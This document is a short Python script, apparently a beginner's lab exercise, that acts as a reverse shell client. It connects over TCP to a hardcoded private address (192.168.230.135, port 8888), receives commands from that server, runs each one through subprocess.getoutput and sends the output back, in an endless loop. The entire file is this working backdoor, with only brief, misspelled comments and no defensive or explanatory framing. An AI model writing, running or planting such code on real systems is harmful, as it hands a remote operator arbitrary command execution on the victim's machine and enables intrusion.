## Python Clinte

# import Socket
import socket
import subprocess
import os

# Connection Create Socket TCP Used
Craete_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect IP and PORT Server
Craete_Socket.connect(("192.168.230.135",8888))
print("Connected")

# Server Data Resv
while True:
    ReciveDate = (Craete_Socket.recv(10000)).decode()
    Cmd = subprocess.getoutput(ReciveDate)
    Craete_Socket.send(Cmd.encode())
    


